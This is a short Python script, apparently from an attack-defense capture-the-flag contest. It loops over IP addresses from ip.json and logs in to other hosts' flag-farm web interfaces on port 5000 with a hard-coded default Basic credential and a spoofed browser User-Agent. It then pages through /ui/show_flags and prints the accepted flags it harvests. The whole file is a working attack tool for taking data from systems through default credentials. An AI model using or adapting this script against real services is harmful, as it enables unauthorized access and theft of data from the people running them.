#!/usr/bin/env python3
import requests
import json

def get_flags(ip, page):
    headers = {
        'Authorization': 'Basic OjEyMzQ=',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    }
    data = {
        "sploit": "",
        "team": "",
        "flag": "",
        "time-since": "",
        "time-until": "",
        "status": "ACCEPTED",
        "checksystem_response": "",
        "page-number": str(page),
    }
    try:
        r = requests.post(f'http://{ip}:5000/ui/show_flags', headers=headers, data=data, timeout=5)
    except Exception:
        return False

    rows = r.json().get('rows', [])
    for row in rows:
        print(row.get('flag'), flush=True)
    return bool(rows)


if __name__ == '__main__':
    try:
        with open('ip.json', 'rt') as f:
            ips = json.load(f)
    except Exception:
        print('no ip.json found', flush=True)
        exit(1)

    for ip, status in ips.items():
        if status != 200:
            continue
        for page in range(1, 3 + 1):
            if not get_flags(ip, page):
                break
